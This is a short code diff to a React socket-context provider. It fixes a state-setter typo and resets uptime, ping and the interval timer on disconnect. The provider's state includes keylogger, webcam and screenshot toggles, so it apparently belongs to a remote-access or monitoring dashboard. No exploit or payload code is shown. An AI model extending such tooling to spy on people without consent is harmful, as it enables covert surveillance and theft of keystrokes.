@@ -108,7 +108,7 @@ export const SocketProvider: React.FC<{ children: ReactNode }> = ({
   const [IsKeyLoggerOn, SetIsKeyLoggerOn] = useState<boolean>(false);
   const [IsWebcamOn, SetIsWebcamOn] = useState<boolean>(false);
   const [IsScreenshotOn, SetIsScreenshotOn] = useState<boolean>(false);
-  const [UpTime, SetUpTIme] = useState<number>(0);
+  const [UpTime, SetUpTime] = useState<number>(0);
   const [Ping, SetPing] = useState<number>(0);
   const IntervalRef = useRef<NodeJS.Timeout | null>(null);
   const SocketRef = useRef<Socket | null>(null);
@@ -165,8 +165,8 @@ export const SocketProvider: React.FC<{ children: ReactNode }> = ({
       SetIsServerConnected(true);
       if (IntervalRef.current) clearInterval(IntervalRef.current);
       IntervalRef.current = setInterval(() => {
-        SetUpTIme((prev) => prev + 1);
-        NewSocket.emit("Ping", Date.now());
+        SetUpTime((prev) => prev + 1);
+        SocketRef.current?.emit("Ping", Date.now());
       }, 1000);
       addToast({
         title: "Connected",
@@ -237,7 +237,8 @@ export const SocketProvider: React.FC<{ children: ReactNode }> = ({
       SetGatewayConnectError(null);
       if (IntervalRef.current) clearInterval(IntervalRef.current);
       IntervalRef.current = null;
-      SetUpTIme(0);
+      SetUpTime(0);
+      SetPing(0);
       SetProcessList([]);
       SetApplicationList([]);
       SetScreenshots([]);
@@ -438,6 +439,10 @@ export const SocketProvider: React.FC<{ children: ReactNode }> = ({
   const DisconnectFromServer = useCallback(() => {
     if (SocketRef.current) {
       SocketRef.current.emit("Client:Disconnect");
+      if (IntervalRef.current) clearInterval(IntervalRef.current);
+      IntervalRef.current = null;
+      SetUpTime(0);
+      SetPing(0);
       SetIsServerConnected(false);
     }
   }, []);
